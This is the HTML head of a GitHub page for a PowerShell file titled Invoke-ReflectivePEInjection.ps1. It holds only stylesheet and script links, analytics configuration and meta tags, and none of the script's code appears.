






<!DOCTYPE html>
<html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-0946cdc16f15.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-3946c959759a.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-9b9a8c91acc5.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-11302a585e33.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-1a4564ab0fbf.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-12a8b2aa9101.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-5924a648f3e7.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-05358496cb79.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-aad6b801a158.css" />
  
  
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-f08069444ca3.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-4b09d265965c.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-5344c827a597.css" />
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/code-eb757dedf4a1.css" />

    <meta name="optimizely-datafile" content="{&quot;groups&quot;: [], &quot;environmentKey&quot;: &quot;production&quot;, &quot;rollouts&quot;: [], &quot;typedAudiences&quot;: [], &quot;projectId&quot;: &quot;16737760170&quot;, &quot;variables&quot;: [], &quot;featureFlags&quot;: [], &quot;experiments&quot;: [], &quot;version&quot;: &quot;4&quot;, &quot;audiences&quot;: [{&quot;conditions&quot;: &quot;[\&quot;or\&quot;, {\&quot;match\&quot;: \&quot;exact\&quot;, \&quot;name\&quot;: \&quot;$opt_dummy_attribute\&quot;, \&quot;type\&quot;: \&quot;custom_attribute\&quot;, \&quot;value\&quot;: \&quot;$opt_dummy_value\&quot;}]&quot;, &quot;id&quot;: &quot;$opt_dummy_audience&quot;, &quot;name&quot;: &quot;Optimizely-Generated Audience for Backwards Compatibility&quot;}], &quot;anonymizeIP&quot;: true, &quot;sdkKey&quot;: &quot;WTc6awnGuYDdG98CYRban&quot;, &quot;attributes&quot;: [{&quot;id&quot;: &quot;16822470375&quot;, &quot;key&quot;: &quot;user_id&quot;}, {&quot;id&quot;: &quot;17143601254&quot;, &quot;key&quot;: &quot;spammy&quot;}, {&quot;id&quot;: &quot;18175660309&quot;, &quot;key&quot;: &quot;organization_plan&quot;}, {&quot;id&quot;: &quot;18813001570&quot;, &quot;key&quot;: &quot;is_logged_in&quot;}, {&quot;id&quot;: &quot;19073851829&quot;, &quot;key&quot;: &quot;geo&quot;}, {&quot;id&quot;: &quot;20175462351&quot;, &quot;key&quot;: &quot;requestedCurrency&quot;}, {&quot;id&quot;: &quot;20785470195&quot;, &quot;key&quot;: &quot;country_code&quot;}, {&quot;id&quot;: &quot;21656311196&quot;, &quot;key&quot;: &quot;opened_downgrade_dialog&quot;}], &quot;botFiltering&quot;: false, &quot;accountId&quot;: &quot;16737760170&quot;, &quot;events&quot;: [{&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;17911811441&quot;, &quot;key&quot;: &quot;hydro_click.dashboard.teacher_toolbox_cta&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18124116703&quot;, &quot;key&quot;: &quot;submit.organizations.complete_sign_up&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18145892387&quot;, &quot;key&quot;: &quot;no_metric.tracked_outside_of_optimizely&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18178755568&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.add_repo&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18180553241&quot;, &quot;key&quot;: &quot;submit.repository_imports.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18186103728&quot;, &quot;key&quot;: &quot;click.help.learn_more_about_repository_creation&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18188530140&quot;, &quot;key&quot;: &quot;test_event&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18191963644&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.transfer_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18195612788&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.import_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18210945499&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.invite_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18211063248&quot;, &quot;key&quot;: &quot;click.empty_org_repo_cta.create_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18215721889&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.update_profile&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18224360785&quot;, &quot;key&quot;: &quot;click.org_onboarding_checklist.dismiss&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18234832286&quot;, &quot;key&quot;: &quot;submit.organization_activation.complete&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18252392383&quot;, &quot;key&quot;: &quot;submit.org_repository.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18257551537&quot;, &quot;key&quot;: &quot;submit.org_member_invitation.create&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18259522260&quot;, &quot;key&quot;: &quot;submit.organization_profile.update&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18564603625&quot;, &quot;key&quot;: &quot;view.classroom_select_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18568612016&quot;, &quot;key&quot;: &quot;click.classroom_sign_in_click&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18572592540&quot;, &quot;key&quot;: &quot;view.classroom_name&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18574203855&quot;, &quot;key&quot;: &quot;click.classroom_create_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18582053415&quot;, &quot;key&quot;: &quot;click.classroom_select_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18589463420&quot;, &quot;key&quot;: &quot;click.classroom_create_classroom&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18591323364&quot;, &quot;key&quot;: &quot;click.classroom_create_first_classroom&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18591652321&quot;, &quot;key&quot;: &quot;click.classroom_grant_access&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18607131425&quot;, &quot;key&quot;: &quot;view.classroom_creation&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;18831680583&quot;, &quot;key&quot;: &quot;upgrade_account_plan&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19064064515&quot;, &quot;key&quot;: &quot;click.signup&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19075373687&quot;, &quot;key&quot;: &quot;click.view_account_billing_page&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19077355841&quot;, &quot;key&quot;: &quot;click.dismiss_signup_prompt&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19079713938&quot;, &quot;key&quot;: &quot;click.contact_sales&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19120963070&quot;, &quot;key&quot;: &quot;click.compare_account_plans&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19151690317&quot;, &quot;key&quot;: &quot;click.upgrade_account_cta&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19424193129&quot;, &quot;key&quot;: &quot;click.open_account_switcher&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19520330825&quot;, &quot;key&quot;: &quot;click.visit_account_profile&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19540970635&quot;, &quot;key&quot;: &quot;click.switch_account_context&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19730198868&quot;, &quot;key&quot;: &quot;submit.homepage_signup&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19820830627&quot;, &quot;key&quot;: &quot;click.homepage_signup&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;19988571001&quot;, &quot;key&quot;: &quot;click.create_enterprise_trial&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20036538294&quot;, &quot;key&quot;: &quot;click.create_organization_team&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20040653299&quot;, &quot;key&quot;: &quot;click.input_enterprise_trial_form&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20062030003&quot;, &quot;key&quot;: &quot;click.continue_with_team&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20068947153&quot;, &quot;key&quot;: &quot;click.create_organization_free&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20086636658&quot;, &quot;key&quot;: &quot;click.signup_continue.username&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20091648988&quot;, &quot;key&quot;: &quot;click.signup_continue.create_account&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20103637615&quot;, &quot;key&quot;: &quot;click.signup_continue.email&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20111574253&quot;, &quot;key&quot;: &quot;click.signup_continue.password&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20120044111&quot;, &quot;key&quot;: &quot;view.pricing_page&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20152062109&quot;, &quot;key&quot;: &quot;submit.create_account&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20165800992&quot;, &quot;key&quot;: &quot;submit.upgrade_payment_form&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20171520319&quot;, &quot;key&quot;: &quot;submit.create_organization&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20222645674&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.discuss_your_needs&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20227443657&quot;, &quot;key&quot;: &quot;submit.verify_primary_user_email&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20234607160&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.try_enterprise&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20238175784&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.team&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20239847212&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.continue_free&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20251097193&quot;, &quot;key&quot;: &quot;recommended_plan&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20438619534&quot;, &quot;key&quot;: &quot;click.pricing_calculator.1_member&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20456699683&quot;, &quot;key&quot;: &quot;click.pricing_calculator.15_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20467868331&quot;, &quot;key&quot;: &quot;click.pricing_calculator.10_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20476267432&quot;, &quot;key&quot;: &quot;click.trial_days_remaining&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20476357660&quot;, &quot;key&quot;: &quot;click.discover_feature&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20479287901&quot;, &quot;key&quot;: &quot;click.pricing_calculator.custom_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20481107083&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.apply_teacher_benefits&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20483089392&quot;, &quot;key&quot;: &quot;click.pricing_calculator.5_members&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20484283944&quot;, &quot;key&quot;: &quot;click.onboarding_task&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20484996281&quot;, &quot;key&quot;: &quot;click.recommended_plan_in_signup.apply_student_benefits&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20486713726&quot;, &quot;key&quot;: &quot;click.onboarding_task_breadcrumb&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20490791319&quot;, &quot;key&quot;: &quot;click.upgrade_to_enterprise&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20491786766&quot;, &quot;key&quot;: &quot;click.talk_to_us&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20494144087&quot;, &quot;key&quot;: &quot;click.dismiss_enterprise_trial&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20499722759&quot;, &quot;key&quot;: &quot;completed_all_tasks&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20500710104&quot;, &quot;key&quot;: &quot;completed_onboarding_tasks&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20513160672&quot;, &quot;key&quot;: &quot;click.read_doc&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20516196762&quot;, &quot;key&quot;: &quot;actions_enabled&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20518980986&quot;, &quot;key&quot;: &quot;click.dismiss_trial_banner&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20535446721&quot;, &quot;key&quot;: &quot;click.issue_actions_prompt.dismiss_prompt&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20557002247&quot;, &quot;key&quot;: &quot;click.issue_actions_prompt.setup_workflow&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20595070227&quot;, &quot;key&quot;: &quot;click.pull_request_setup_workflow&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20626600314&quot;, &quot;key&quot;: &quot;click.seats_input&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20642310305&quot;, &quot;key&quot;: &quot;click.decrease_seats_number&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20662990045&quot;, &quot;key&quot;: &quot;click.increase_seats_number&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20679620969&quot;, &quot;key&quot;: &quot;click.public_product_roadmap&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20761240940&quot;, &quot;key&quot;: &quot;click.dismiss_survey_banner&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20767210721&quot;, &quot;key&quot;: &quot;click.take_survey&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20795281201&quot;, &quot;key&quot;: &quot;click.archive_list&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20966790249&quot;, &quot;key&quot;: &quot;contact_sales.submit&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20996500333&quot;, &quot;key&quot;: &quot;contact_sales.existing_customer&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;20996890162&quot;, &quot;key&quot;: &quot;contact_sales.blank_message_field&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21000470317&quot;, &quot;key&quot;: &quot;contact_sales.personal_email&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21002790172&quot;, &quot;key&quot;: &quot;contact_sales.blank_phone_field&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21354412592&quot;, &quot;key&quot;: &quot;click.dismiss_create_readme&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21366102546&quot;, &quot;key&quot;: &quot;click.dismiss_zero_user_content&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21370252505&quot;, &quot;key&quot;: &quot;account_did_downgrade&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21370840408&quot;, &quot;key&quot;: &quot;click.cta_create_readme&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21375451068&quot;, &quot;key&quot;: &quot;click.cta_create_new_repository&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21385390948&quot;, &quot;key&quot;: &quot;click.zero_user_content&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21467712175&quot;, &quot;key&quot;: &quot;click.downgrade_keep&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21484112202&quot;, &quot;key&quot;: &quot;click.downgrade&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21495292213&quot;, &quot;key&quot;: &quot;click.downgrade_survey_exit&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21508241468&quot;, &quot;key&quot;: &quot;click.downgrade_survey_submit&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21512030356&quot;, &quot;key&quot;: &quot;click.downgrade_support&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21539090022&quot;, &quot;key&quot;: &quot;click.downgrade_exit&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21543640644&quot;, &quot;key&quot;: &quot;click_fetch_upstream&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21646510300&quot;, &quot;key&quot;: &quot;click.move_your_work&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21656151116&quot;, &quot;key&quot;: &quot;click.add_branch_protection_rule&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21663860599&quot;, &quot;key&quot;: &quot;click.downgrade_dialog_open&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21687860483&quot;, &quot;key&quot;: &quot;click.learn_about_protected_branches&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21689050333&quot;, &quot;key&quot;: &quot;click.dismiss_protect_this_branch&quot;}, {&quot;experimentIds&quot;: [], &quot;id&quot;: &quot;21864370109&quot;, &quot;key&quot;: &quot;click.sign_in&quot;}], &quot;revision&quot;: &quot;1372&quot;}" />


  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-451d2fee086f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_stacktrace-parser_dist_stack-trace-parser_esm_js-node_modules_github_bro-327bbf-0aaeb22dd2a5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_soft-nav_soft-nav_ts-de360abf3418.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-9fa8265d4c66.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-2646a2c533e3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-99e288659d4f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_fzy_js_index_js-node_modules_github_markdown-toolbar-element_dist_index_js-e3de700a4c9d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-44ef1e-ff95e778f461.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_details-dialog-element_dist_index_js-node_modules_github_memoize_-8664b7-b1d9fac72bf3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_delegated-events_dist_in-d36001-e1c38c8467da.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_github_text-ex-3415a8-7ecc10fb88d0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_tab-container-element_dist_index_js-node_modules_github_auto-comp-bf192d-81631767a9f8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_view-components_app_components_primer_primer_js-node_modules_gith-6a1af4-1744f0940b1b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-a576981e43d1.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-081092cbde8f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-9d9fe1859ce5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_alive-client_dist-bf5aa2-424aa982deef.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-ba0e4d5b3207.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_hotkey_dist_index_js-b47a28757074.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_dimensions_js-node_modules_github_hydro-analyt-f69502-d8672aa6f36b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-35b3ae68c408.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_github_template-parts_lib_-273494-0fb4f42e57f4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_paste-markdown_dist_index_esm_js-node_modules_github_quote-select-1bdbba-dd6debfb8eb8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_updatable-content_ts-70e6c1269039.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_keyboard-shortcuts-helper_ts-app_assets_modules_github_bl-1f24ae-60413f6f3a61.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_onfocus_ts-app_ass-dbc08c-c80bb6d2e713.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-1d145b63ed56.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-2e2258-dae7d38e0248.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-80a9915bf75c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-af0fd5d569dd.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-06ff531-fe0b8ccc90a5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-86e9ba7bffb7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_optimizely_optimizely-sdk_dist_optimizely_browser_es_min_js-node_modules-3f2a9e-fc88059edf41.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/optimizely-88264c7905d8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_morphdom_dist_morphdom-esm_js-node_modules_github_template-parts_lib_index_js-58417dae193c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_virtualized-list_es_index_js-node_modules_github_memoize_dist_esm_index_js-8496b7c4b809.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_github_mini-th-34a24a-01ff22798072.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_ref-selector_ts-7bdefeb88a1a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/repositories-1e8ac8fa769f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-414f05-4046b86b0100.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_clipboard-copy-element_dist_index_esm_js-node_modules_github_mini-17eb43-0e309b61f5f6.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_diffs_blob-lines_ts-app_assets_modules_github_diffs_linkable-line-n-f96c66-3aec21e0f76c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/diffs-33e9e3a841ed.js"></script>
  

  <title>PowerShell/Invoke-ReflectivePEInjection.ps1 at master · clymb3r/PowerShell · GitHub</title>



  <meta name="route-pattern" content="/:user_id/:repository/blob/*name(/*path)">

    
  <meta name="current-catalog-service-hash" content="581425c0eaaa5e5e53c5b736f58a14dbe5d38b0be425901738ad0670bd1d5a33">


  <meta name="request-id" content="E4E2:2139:F5F109:1702DF9:64368557" data-pjax-transient="true"/><meta name="html-safe-nonce" content="b5eec6d8ed2bb4d98437f8928fda167148ec43a38d2b021c3577b83bd929b116" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiJFNEUyOjIxMzk6RjVGMTA5OjE3MDJERjk6NjQzNjg1NTciLCJ2aXNpdG9yX2lkIjoiNjM3MzYwNDE0ODkzNDc3MjA1NSIsInJlZ2lvbl9lZGdlIjoiaWFkIiwicmVnaW9uX3JlbmRlciI6ImlhZCJ9" data-pjax-transient="true"/><meta name="visitor-hmac" content="e10da9764d3860cf616ac18517301a5c3880bb169a979fb2b9a98610d8868952" data-pjax-transient="true"/>


    <meta name="hovercard-subject-tag" content="repository:9093330" data-turbo-transient>


  <meta name="github-keyboard-shortcuts" content="repository,source-code,file-tree" data-turbo-transient="true" />
  

  <meta name="selected-link" value="repo_source" data-turbo-transient>

    <meta name="google-site-verification" content="c1kuD-K2HIVF635lypcsWPoD4kilo5-jA_wBFyT4uMY">
  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">
  <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-turbo-transient="true" />

  




  

    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">
    
